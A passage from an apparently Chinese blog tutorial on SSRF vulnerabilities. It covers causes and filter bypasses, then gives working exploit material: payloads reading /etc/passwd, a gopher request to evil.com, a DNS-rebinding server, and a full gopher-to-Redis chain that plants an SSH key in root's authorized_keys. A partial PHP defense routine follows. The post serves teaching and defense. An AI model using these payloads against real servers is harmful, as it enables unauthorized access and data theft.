class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>就如上文所说，通过控制url参数可以使服务器可访问人任意网站，如<a href="http://localhost/ssrf.php?url=http://www.baidu.com：" target="_blank" rel="noopener">http://localhost/ssrf.php?url=http://www.baidu.com：</a></p><p><img src="/ssrf-SSRF成因、攻击和防御/1549351620627.png" alt="1549351620627"></p><p>由于是服务端产生的跳转，因此用户这里看不到访问百度的请求，也因此攻击者可以利用其探索内网资源。</p><p>参考猪猪侠的PPT，容易发生SSRF漏洞的地方有：</p><ul><li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS feed）</li><li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li><li>Webmail收取其他邮箱邮件（POP3、IMAP、SMTP）</li><li>文件处理、编码处理、属性信息处理（ffpmg、ImageMagic、DOCX、PDF、XML处理器）<ul><li>FFmpeg: concat： <a href="http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd" target="_blank" rel="noopener">http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd</a></li><li>ImageMagick: fill ‘url(<a href="http://ssrf.wuyun.org" target="_blank" rel="noopener">http://ssrf.wuyun.org</a>)’</li><li>SVG, JPG, XML, Json</li></ul></li></ul><p>容易发生SSRF漏洞的服务有：</p><ol><li>图片加载与下载：通过URL地址加载或下载图片</li><li>Webhooks</li><li>通过URL地址分享网页内容</li><li>转码服务</li><li>在线翻译</li><li>图片、文章收藏功能</li><li>未公开的api实现以及其他调用URL的功能</li><li>从URL关键字中寻找</li></ol><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>总的来说，一个网站存在SSRF则会有如下利用点</p><ul><li><p>服务探测</p><p>关键在于对通过<strong>报错信息、响应时间</strong>判断是否服务是否存在</p></li><li><p>文件读取</p><p>主要使用file协议对文件进行读取操作</p></li><li><p>对内网服务进行攻击（如redis写文件）</p></li><li><p>使用FastCGI进行远程命令执行</p></li><li><p>SSRF转反射式XSS</p><p>如：<code>http://localhost:4567/?url=http://brutelogic.com.br/poc.svg</code></p></li><li><p>在PDF中嵌入脚本</p><p>使用<a href="https://pdfcrowd.com/#convert_by_input，将html嵌入pdf中：" target="_blank" rel="noopener">https://pdfcrowd.com/#convert_by_input，将html嵌入pdf中：</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">”file:///etc/passwd”</span> <span class="attr">width</span>=<span class="string">”400</span>" <span class="attr">height</span>=<span class="string">”400</span>"&gt;</span></span><br><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">document.write(document.location)</span>&gt;</span> -- to know the path and some times to know what os they are using at backend</span><br></pre></td></tr></table></figure></li></ul><h2 id="可利用的协议"><a href="#可利用的协议" class="headerlink" title="可利用的协议"></a>可利用的协议</h2><p>支持的协议远不止这些，仅列出常用的：</p><ul><li><p>file://</p><p>用于读取本地文件，如：<code>http://example.com/ssrf.php?url=file:///etc/passwd</code></p></li><li><p>http:// &amp; https://</p><p>用于访问内网http服务</p></li><li><p>ftp://</p><p>访问FTP服务</p></li><li><p>dict://xxx/info</p><p>可以泄露软件版本，或是操作内网redis服务等</p></li><li><p>gopher://</p><p>java支持，php需要开启Gopher wrapper，%0a用于换行，具体用法如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// http://safebuff.com/ssrf.php?url=http://evil.com/gopher.php</span><br><span class="line">&lt;?php</span><br><span class="line">        header(&apos;Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest&apos;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">evil.com:# nc -v -l 12346</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 12346)</span><br><span class="line">Connection from [192.168.0.10] port 12346 [tcp/*] accepted (family 2, sport 49398)</span><br><span class="line">HI</span><br><span class="line">Multiline</span><br><span class="line">test</span><br></pre></td></tr></table></figure></li></ul><h1 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h1><h2 id="绕过IP限制"><a href="#绕过IP限制" class="headerlink" title="绕过IP限制"></a>绕过IP限制</h2><h3 id="十六进制IP"><a href="#十六进制IP" class="headerlink" title="十六进制IP"></a>十六进制IP</h3><p>如：0xA000001=10.0.0.1</p><h3 id="十进制IP"><a href="#十进制IP" class="headerlink" title="十进制IP"></a>十进制IP</h3><p>如：167772161=10.0.0.1</p><h3 id="八进制IP"><a href="#八进制IP" class="headerlink" title="八进制IP"></a>八进制IP</h3><p>如 012.0.0.1=10.0.0.1</p><h2 id="绕过Domain限制"><a href="#绕过Domain限制" class="headerlink" title="绕过Domain限制"></a>绕过Domain限制</h2><h3 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a><a href="http://xip.io" target="_blank" rel="noopener">xip.io</a></h3><ul><li>如：<a href="http://www.baidu.com.192.168.1.10.xip.io（将www.baidu.com地址解析到192.168.1.10）" target="_blank" rel="noopener">http://www.baidu.com.192.168.1.10.xip.io（将www.baidu.com地址解析到192.168.1.10）</a></li></ul><h3 id="nip-io"><a href="#nip-io" class="headerlink" title="nip.io"></a><a href="http://nip.io/" target="_blank" rel="noopener">nip.io</a></h3><h3 id="特殊字母"><a href="#特殊字母" class="headerlink" title="特殊字母"></a>特殊字母</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com</span><br><span class="line"></span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><h3 id="HTTP-基础认证"><a href="#HTTP-基础认证" class="headerlink" title="HTTP 基础认证"></a>HTTP 基础认证</h3><p>如：<a href="http://xxx.com@attacker.com" target="_blank" rel="noopener">http://xxx.com@attacker.com</a></p><h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>基本原理是自建DNS服务器，使第一次解析为外网ip，第二次解析为内网ip</p><p>在自己域名上绑定A记录和NS记录：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549437045205.png" alt="1549437045205"></p><p>A记录指将ns1.anemone.top解析到118.x.x.184</p><p>NS记录指子域名test.anemone.top由ns1.anemone.top来解析</p><p>同时在一个dns服务（这里我在腾讯云上没试验成功，猜测是腾讯云屏蔽了udp端口的入向）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># @file dns_server.py</span></span><br><span class="line"><span class="comment"># @brief dns_server</span></span><br><span class="line"><span class="comment"># @author Anemone95,x565178035@126.com</span></span><br><span class="line"><span class="comment"># @version 1.0</span></span><br><span class="line"><span class="comment"># @date 2019-02-06 14:58</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">"104.160.43.154"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"127.0.0.1"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        print(name+<span class="string">" ===&gt; "</span>+ip)</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure><p>结果（只能模拟一下效果）：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549441559220.png" alt="1549441559220"></p><h2 id="绕过协议限制"><a href="#绕过协议限制" class="headerlink" title="绕过协议限制"></a>绕过协议限制</h2><h3 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h3><p>攻击者建立<a href="http://127.0.0.1:8888/302.php：" target="_blank" rel="noopener">http://127.0.0.1:8888/302.php：</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location:  dict://127.0.0.1:6379/set:1:helo"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>接着访问靶机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/ssrf.php?url=http://127.0.0.1:8888/302.php</span><br></pre></td></tr></table></figure><p>可以看到脆弱服务器6379端口收到了请求，协议被绕过：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549355712656.png" alt="1549355712656"></p><h3 id="使用-0d-0a-r-n"><a href="#使用-0d-0a-r-n" class="headerlink" title="使用%0d%0a(\r\n)"></a>使用%0d%0a(\r\n)</h3><p>之所以要使用其他协议是因为http的get请求没有换行，那么在url中加上<code>%0d%0a</code>就有可能模拟一个换行操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">operator=http://wuyun.org:6379/helo</span><br><span class="line">%0d%0a(\r\n)</span><br><span class="line">config set dir /etc/cron.d/</span><br><span class="line">%0d%0a(\r\n)</span><br><span class="line">quit%0d%0a(\r\n)</span><br></pre></td></tr></table></figure><h2 id="Gopher利用Redis示例"><a href="#Gopher利用Redis示例" class="headerlink" title="Gopher利用Redis示例"></a>Gopher利用Redis示例</h2><p>gopher://协议可以模拟出tcp client的效果，因此可以模拟redis-cli，若服务器redis存在漏洞的话，就可以通过该方法提权。</p><p>准备一个普通redis攻击时用的脚本，注意192.168.99.100和6379需要替换成自己的redis IP和端口（不是攻击者的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n\n"</span>; cat ~/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n\n"</span>) &gt; upload.txt</span><br><span class="line">cat ~/upload.txt | redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> tmp</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x get tmp</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x quit</span><br></pre></td></tr></table></figure><p>关于脚本的解释可以看<a href="http://anemone.top/%E7%BB%84%E4%BB%B6-redis%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%BC%B1%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E9%98%B2%E6%8A%A4/">redis未授权&amp;弱密码漏洞复现和防护</a></p><p>拦截6379的数据包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:192.168.70.128:6379 2&gt;&amp;1|tee socat.log</span><br></pre></td></tr></table></figure><p>执行脚本，将攻击流量打到测试机器上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash shell.sh 127.0.0.1 4444</span><br></pre></td></tr></table></figure><p><img src="/ssrf-SSRF成因、攻击和防御/1549458278181.png" alt="1549458278181"></p><p>这时socat那看到攻击流量：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549458694665.png" alt="1549458694665"></p><p>使用脚本将攻击流量转换为gopher协议，先来了解一下socat日志记录tcp流的格式：</p><ul><li><p><code>&lt;</code>开头一行表示客户端发送来了一个tcp包，下面为包内容，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt; 2019/02/06 21:58:17.968244  length=51 from=0 to=50</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$10\r</span><br><span class="line">/root/.ssh\r</span><br></pre></td></tr></table></figure></li><li><p><code>&gt;</code>开头一行表示服务器返回一个tcp包，下面为包内容，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt; 2019/02/06 21:58:17.981363  length=5 from=0 to=4</span><br><span class="line">+OK\r</span><br></pre></td></tr></table></figure></li></ul><p>基于以上格式，将客户端发送的tcp包转换为payload：</p><ul><li>将\r字符串替换成%0d%0a</li><li>空白行替换为%0a</li><li>空格替换成%20</li><li>再使用urlencode（给php时会做一次decode，curl再做一次decode）</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line">socat_file=sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="comment">#  socat_file='./socat.log'</span></span><br><span class="line"></span><br><span class="line">client_tcp=<span class="literal">True</span></span><br><span class="line"><span class="keyword">with</span> open(socat_file) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">'&gt;'</span>):</span><br><span class="line">            client_tcp=<span class="literal">True</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> line.startswith(<span class="string">'&lt;'</span>):</span><br><span class="line">            client_tcp=<span class="literal">False</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> client_tcp:</span><br><span class="line">            <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r'\r'</span>:</span><br><span class="line">               <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">               <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                   exp = exp + <span class="string">'%0a%0d%0a'</span></span><br><span class="line">               <span class="keyword">else</span>:</span><br><span class="line">                   line = line.replace(<span class="string">r'\r'</span>, <span class="string">'%0d%0a'</span>)</span><br><span class="line">                   <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                   line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">                   exp = exp + line</span><br><span class="line">            <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">            <span class="keyword">elif</span> line == <span class="string">'\x0a'</span>:</span><br><span class="line">               exp = exp + <span class="string">'%0a'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">               line = line.replace(<span class="string">' '</span>, <span class="string">'%20'</span>)</span><br><span class="line">               line = line.replace(<span class="string">'\n'</span>, <span class="string">''</span>)</span><br><span class="line">               exp = exp + line</span><br><span class="line">exp=quote(exp)</span><br><span class="line">print(exp)</span><br></pre></td></tr></table></figure><p>使用脚本生成payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python socat2gopher.py socat.log</span><br></pre></td></tr></table></figure><p><img src="/ssrf-SSRF成因、攻击和防御/1549509311002.png" alt="1549509311002"></p><p>将exp用gopher协议发送（这里的192.168.70.128:6379是受害者内网的redis服务器）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="string">'http://127.0.0.1/ssrf.php?url=gopher://192.168.70.129:6379/_%2A3%250d%250a%243%250d%250aset%250d%250a%243%250d%250atmp%250d%250a%24413%250d%250a%250a%250a%250a%250assh-rsa%2520AAAAB3NzaC1yc2EAAAADAQABAAABAQDNPLyFJPazctB0%2BJAWQ8%2B5pNIOlGMYLmTupLXT5EjFkEDzKhkGu8l%2BC4ja/s4IIoMBtoxDPcogMLRFtxWv%2BA6WIvFQhAsqcaDBl48mXmsiHtKJbooNLplu/fTvdSjisnaF8Qsa/zRSWubPSfzzz5ObhsLhpXD/hcMofUZxofbysT0yWhmlTdC7i2GDIxlZPlSdpAxwPo0BgaP5GO/6GQ49GC4niw5j2UTAqBDQWqwWww5yxNXU/iY9YY83MUbMpuUlLgmpne1lFhY2jQ69uPiVPKUWWHPcNHgIeNqVAoTCFXSvjVgnDu/iHQSkm0o0uW/who12xgxAOXm3MU1cX9gL%2520anemone%40DESKTOP-ANEMONE%250a%250a%250a%250a%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2410%250d%250a/root/.ssh%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%2415%250d%250aauthorized_keys%250d%250a%2A2%250d%250a%243%250d%250aget%250d%250a%243%250d%250atmp%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'</span></span><br></pre></td></tr></table></figure><p>返回5个<code>+OK</code>表示写入成功：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549509436064.png" alt="1549509436064"></p><p>可以看到远程服务器上的公钥已经写入：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549459966337.png" alt="1549459966337"></p><p>ssh可以登录：</p><p><img src="/ssrf-SSRF成因、攻击和防御/1549459989638.png" alt="1549459989638"></p><h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><p>考虑到以上的各种绕过，产生如下基本思路（参考p神的<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">谈一谈如何在Python开发中拒绝SSRF漏洞</a>）：</p><ol><li><p><strong>只允许http或https协议</strong></p></li><li><p>解析目标URL，获取其host</p></li><li><p>解析host，获取host指向的IP地址转换成long型</p></li><li><p><strong>检查IP地址是否为内网IP</strong></p></li><li><p>请求URL</p></li><li><p>如果有跳转，拿出跳转URL，执行1(或者直接进用302跳转)，否则返回页面结果</p></li></ol><p>参考<a href="https://www.jianshu.com/p/6ea9b8652d73" target="_blank" rel="noopener">PHP开发中防御SSRF</a>给出php的实现（Python实现请看<a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="noopener">谈一谈如何在Python开发中拒绝SSRF漏洞</a>）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = CURL_INIT();</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_HEADER, <span class="keyword">FALSE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">TRUE</span>);</span><br><span class="line">    CURL_SETOPT($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">FALSE</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        <span class="comment">// 0.判断URL合法性</span></span><br><span class="line">        <span class="keyword">if</span> (!$url || !filter_var($url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED &amp; FILTER_FLAG_HOST_REQUIRED &amp; FILTER_FLAG_QUERY_REQUIRED))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.仅允许http或https协议</span></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?:\/\/.*$/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.解析目标URL，获取其host</span></span><br><span class="line">        $host = parse_url($url, PHP_URL_HOST);</span><br><span class="line">        <span class="keyword">if</span>(!$host)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.解析host，获取host指向的IP地址</span></span><br><span class="line">        $ip = gethostbyname($host);</span><br><span class="line">        $ip = ip2long($ip);</span><br><span class="line">        <span class="keyword">if</span>($ip === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.检查IP地址是否为内网IP</span></span><br><span class="line">        $is_inner_ipaddress = ip2long(<span class="string">'127.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == $ip &gt;&gt; <span class="number">24</span> <span class="keyword">or</span></span><br><span class="line">            ip2long(<span class="string">'10.0.0.0'</span>) &gt;&gt; <span class="number">24</span> == $ip &gt;&gt; <span 